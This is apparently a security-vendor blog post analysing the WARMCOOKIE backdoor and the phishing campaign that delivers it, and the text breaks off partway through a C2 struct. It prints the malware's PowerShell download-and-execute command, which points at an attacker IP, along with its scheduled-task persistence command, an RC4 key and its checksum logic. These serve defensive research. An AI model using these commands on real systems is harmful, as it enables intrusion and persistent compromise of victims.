<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Dipping into Danger: The WARMCOOKIE backdoor — Elastic Security Labs</title><meta name="description" content="Elastic Security Labs observed threat actors masquerading as recruiting firms to deploy a new malware backdoor called WARMCOOKIE. This malware has standard backdoor capabilities, including capturing screenshots, executing additional malware, and reading/writing files."/><meta property="og:title" content="Dipping into Danger: The WARMCOOKIE backdoor — Elastic Security Labs"/><meta property="og:description" content="Elastic Security Labs observed threat actors masquerading as recruiting firms to deploy a new malware backdoor called WARMCOOKIE. This malware has standard backdoor capabilities, including capturing screenshots, executing additional malware, and reading/writing files."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/dipping-into-danger/warmcookie.jpg?0984aab3e495f55abc8cfae867116d11"/><meta property="og:image:alt" content="Elastic Security Labs observed threat actors masquerading as recruiting firms to deploy a new malware backdoor called WARMCOOKIE. This malware has standard backdoor capabilities, including capturing screenshots, executing additional malware, and reading/writing files."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/dipping-into-danger"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Dipping into Danger: The WARMCOOKIE backdoor — Elastic Security Labs"/><meta name="twitter:description" content="Elastic Security Labs observed threat actors masquerading as recruiting firms to deploy a new malware backdoor called WARMCOOKIE. This malware has standard backdoor capabilities, including capturing screenshots, executing additional malware, and reading/writing files."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/dipping-into-danger/warmcookie.jpg?0984aab3e495f55abc8cfae867116d11"/><meta name="twitter:image:alt" content="Elastic Security Labs observed threat actors masquerading as recruiting firms to deploy a new malware backdoor called WARMCOOKIE. This malware has standard backdoor capabilities, including capturing screenshots, executing additional malware, and reading/writing files."/><link rel="canonical" href="https://www.elastic.co/security-labs/dipping-into-danger"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-791da5e634930df4.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-3d74e9a05863bcfd.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/dipping-into-danger"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/dipping-into-danger"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2024-06-12T00:00:00.000Z">12 June 2024</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/daniel-stepanic">Daniel Stepanic</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Dipping into Danger: The WARMCOOKIE&nbsp;backdoor</span></h1><p class="text-zinc-200 text-base md:text-xl">Novel malware discovery by Elastic Security Labs masquerades as a recruiting offer</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>27 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/malware-analysis">Malware analysis</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Dipping into Danger: The WARMCOOKIE backdoor" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fdipping-into-danger%2Fwarmcookie.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="warmcookie-at-a-glance" class="absolute -top-32"></span>WARMCOOKIE at a glance</h2>
<p>Elastic Security Labs observed a wave of email campaigns in late April targeting environments by deploying a new backdoor we’re calling WARMCOOKIE based on data sent through the HTTP cookie parameter. During initial triage, our team identified code overlap with a previously publicly reported <a href="https://esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign">sample</a> by eSentire. The unnamed sample (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">resident2.exe</code>) discussed in the post appears to be an older or deviated version of WARMCOOKIE. While some features are similar, such as the implementation of string obfuscation, WARMCOOKIE contains differing functionality. Our team is seeing this threat distributed daily with the use of recruiting and job themes targeting individuals.</p>
<p>WARMCOOKIE appears to be an initial backdoor tool used to scout out victim networks and deploy additional payloads. Each sample is compiled with a hard-coded C2 IP address and RC4 key.</p>
<p>This post will review an observed campaign and this new malware’s functionality. While the malware has a limited number of capabilities, it shouldn’t be taken lightly as it’s actively being used and impacting organizations at a global scale.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="key-takeaways" class="absolute -top-32"></span>Key takeaways</h2>
<ul>
<li>REF6127 represents recruiting-themed phishing campaigns to deploy a new Windows backdoor: WARMCOOKIE</li>
<li>WARMCOOKIE is a newly discovered backdoor used to fingerprint a machine, capture screenshots of the victim machine, and deploy additional payloads</li>
<li>Threat actors are spinning up new domains and infrastructure weekly to support these campaigns</li>
<li>This research includes an IDAPython script to decrypt strings from WARMCOOKIE</li>
<li>Elastic Security provides prevention and visibility capabilities across the entire WARMCOOKIE infection chain</li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="ref6127-campaign-overview" class="absolute -top-32"></span>REF6127 campaign overview</h2>
<p></p>
<p>Since late April 2024, our team has observed new phishing campaigns leveraging lures tied to recruiting firms. These emails targeted individuals by their names and their current employer, enticing victims to pursue new job opportunities by clicking a link to an internal system to view a job description. Below is an example of the phishing email collected from previous open source reporting.</p>
<p></p>
<p>Once clicked, the users hit a landing page that looks like a legitimate page specifically targeted for them. There, they are prompted to download a document by solving a CAPTCHA challenge. The landing pages resemble previous campaigns documented by Google Cloud’s security team when discussing a new variant of <a href="https://cloud.google.com/blog/topics/threat-intelligence/rm3-ldr4-ursnif-banking-fraud/">URSNIF</a>. Below is an example of the landing page collected from previous open source reporting.</p>
<p></p>
<p>Once the CAPTCHA is solved, an obfuscated JavaScript file is downloaded from the page. Our sample was named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Update_23_04_2024_5689382.js</code>; however, other samples used a different but similar naming structure.</p>
<p>This obfuscated script runs PowerShell, kicking off the first task to load WARMCOOKIE.</p>
<p></p>
<p>The PowerShell script abuses the Background Intelligent Transfer Service (BITS) to download WARMCOOKIE and run the DLL with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Start</code> export.</p>
<pre><code>start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + &#x27;\&#x27; + 
    [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 
    &#x27;http://80.66.88[.]146/data/5fb6dd81093a0d6812c17b12f139ce35&#x27; 
    -Destination $d; if (![System.IO.File]::Exists($d)) {exit}; $p = $d + 
    &#x27;,Start&#x27;; rundll32.exe $p; Start-Sleep -Seconds 10} -Argument 0 | wait-job | Receive-Job</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="ref6127-infrastructure-overview" class="absolute -top-32"></span>REF6127 infrastructure overview</h3>
<p>By leveraging tools like <a href="https://urlscan.io/ip/45.9.74.135">urlscan.io</a> and <a href="https://www.virustotal.com/gui/ip-address/45.9.74.135/relations">VirusTotal</a>, we observed the threat actor continually generating new landing pages rapidly on IP address <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45.9.74[.]135</code>. The actor pushed to target different recruiting firms in combination with keywords related to the job search industry.</p>
<p></p>
<p>Before hitting each landing page, the adversary distances itself by using compromised infrastructure to host the initial phishing URL, which redirects the different landing pages.</p>
<p></p>
<p>The threat actor generates new domains while the reputation catches up with each domain after each campaign run. At the time of writing, the threat actor can be seen pivoting to fresh domains without many reputation hits.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="warmcookie-malware-anlaysis" class="absolute -top-32"></span>WARMCOOKIE malware anlaysis</h2>
<p>WARMCOOKIE is a Windows DLL used by the threat actor in two different stages. The first stage occurs right after the PowerShell download with the execution of WARMCOOKIE using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Start</code> export.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-1" class="absolute -top-32"></span>Stage 1</h3>
<p>Stage 1 copies the downloaded DLL from a temporary directory with a random name, such as: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">wid4ta3v.3gm,</code> and places a copy of the DLL at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">C:\ProgramData\RtlUpd\RtlUpd.dll</code></p>
<p>After the copy, the malware sets up persistence using COM with the Windows Task Scheduler to configure the DLL to run with the following parameters.</p>
<pre><code>&quot;C:\WINDOWS\system32\rundll32.exe&quot; &quot;C:\ProgramData\RtlUpd\RtlUpd.dll&quot;,Start /p</code></pre>
<p>With this design choice, WARMCOOKIE will run with System privileges from the Task Scheduler Engine. Below is a screenshot from <a href="https://tria.ge/240528-2dhvdagb62/behavioral1">Hatching Triage</a> showing these two stages:</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence" class="absolute -top-32"></span>Persistence</h4>
<p>A critical part of the infection chain comes from the scheduled task, which is set up at the very beginning of the infection. The task name (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RtlUpd</code>) is scheduled to run every 10 minutes every day.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-2" class="absolute -top-32"></span>Stage 2</h3>
<p>The second stage is where the DLL is combined with the command line (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Start /p</code>) and contains the core functionality of WARMCOOKIE. The malware starts by looking for the DLL inside the temporary directory from the PowerShell download.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="obfuscation" class="absolute -top-32"></span>Obfuscation</h4>
<p>WARMCOOKIE protects its strings using a custom string decryption algorithm. The first four bytes of each encrypted string in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.rdata</code> section represent the size, the next four-bytes represent the RC4 key, and the remaining bytes represent the string.</p>
<p></p>
<p>Below is the CyberChef recipe using the bytes from the screenshot above:</p>
<p></p>
<p>One interesting observation is that the malware developer doesn’t always rotate the RC4 key between the encrypted strings.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="dynamic-api-loading" class="absolute -top-32"></span>Dynamic API loading</h4>
<p>To prevent static analysis from identifying its core functionality, WARMCOOKIE uses dynamic API loading. There is no API hashing/resolving, and the targeted DLLs and sensitive strings are protected using encryption.</p>
<p></p>
<p>As demonstrated in the previous image, the developer shows some consideration for OpSec: any decrypted string is wiped from memory immediately after use, potentially avoiding memory signature scans.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="anti-debugging" class="absolute -top-32"></span>Anti-debugging</h4>
<p>The malware contains a few anti-analysis checks commonly used to target sandboxes. These are based on logic for checking the active number of CPU processors and physical/virtual memory values.</p>
<p></p>
<p>Below are the following conditions:</p>
<ul>
<li>If the number of processors is greater than or equal to 4 and the calculated value from the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GlobalMemoryStatusEx</code> call is greater than or equal to 0xF00, the malware will continue execution</li>
<li>If the number of processors is greater than or equal to 8, the malware will continue execution</li>
<li>If the calculated value from the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GlobalMemoryStatusEx</code> call is greater than <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x2000</code>, the malware will continue execution</li>
</ul>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="mutex" class="absolute -top-32"></span>Mutex</h4>
<p>Each WARMCOOKIE sample comes hard coded with a GUID-like string as a mutex. Below are some examples we have observed:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">f92e6f3c-9cc3-4be0-966c-1be421e69140</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">91f785f4-2fa4-4c85-954d-b96768ca76f2</code></li>
</ul>
<p></p>
<p>Before the main functionality is executed, WARMCOOKIE uses an OR statement to verify the command-line arguments with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/p</code> returns <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">True</code> or to check whether the scheduled task persistence needs to be created.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="execution" class="absolute -top-32"></span>Execution</h4>
<p>Before the backdoor makes its first outbound network request, it captures the following values used to fingerprint and identify the victim machine.</p>
<ul>
<li>Volume serial number</li>
<li>DNS domain of the victim machine</li>
<li>Computer name</li>
<li>Username</li>
</ul>
<p>This was a criteria used to identify the similarities to the malware in eSentire’s <a href="https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign">report</a>.</p>
<p></p>
<p>The WARMCOOKIE C2 server likely leverages a CRC32 checksum function to verify content sent from the victim machine. Inside WARMCOOKIE itself is a checksum function that takes an input string, a length, and an initial seed value for the CRC32 function. At the beginning of the function, the seed value is negated, so at different times, the checksum function is called with different seeds. We believe the developer added this step to make it a little harder for researchers to analyze and waste time.</p>
<p></p>
<p>The following three checksum calculations are encrypted with RC4 and sent through the HTTP cookie parameter:</p>
<ul>
<li>CRC32(c2_message_data)</li>
<li>CRC32(mutex) ^ volume serial number</li>
<li>CRC32(username) ^ CRC32(computer name)</li>
</ul>
<p>Below is the implementation in Python with a usage example in the Appendix:</p>
<pre><code>def calculate_checksum(str_input, str_len, i):
    if i == 0:
        i = 0xFFFFFFFF
    if i == -1:
        i = 0

    for idx in range(0, str_len, 2):
        v6 = str_input[idx] | (str_input[idx + 1] &lt;&lt; 8)
        for _ in range(16):
            if (v6 ^ i) &amp; 1:
                i = ((i &gt;&gt; 1) ^ 0xEDB88320) &amp; 0xFFFFFFFF
            else:
                i = (i &gt;&gt; 1) &amp; 0xFFFFFFFF
            v6 &gt;&gt;= 1

    return ~i &amp; 0xFFFFFFFF</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="communication" class="absolute -top-32"></span>Communication</h4>
<p>WARMCOOKIE samples communicate over HTTP with a hardcoded IP address. The family uses a combination of RC4 and Base64 to protect its network traffic. The RC4 key is embedded in each sample. We have observed the same key being used in multiple samples. The key during this analysis is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">24de21a8dc08434c</code></p>
<p></p>
<p>The malware uses a custom structure to send the initial request to the C2 server, including the previously described checksum values and several fields used to track the offsets and size of the variable data.</p>
<p>These values are sent through the HTTP cookie parameter using the following custom structure:</p>
<pre><code>enum request_type
{ 
    REGISTRATION = 1, 
    COMMAND = 2 
};

struct os_info
{
    int major_version;
    int minor_version;
    int build_number;
    int version_calc;
};

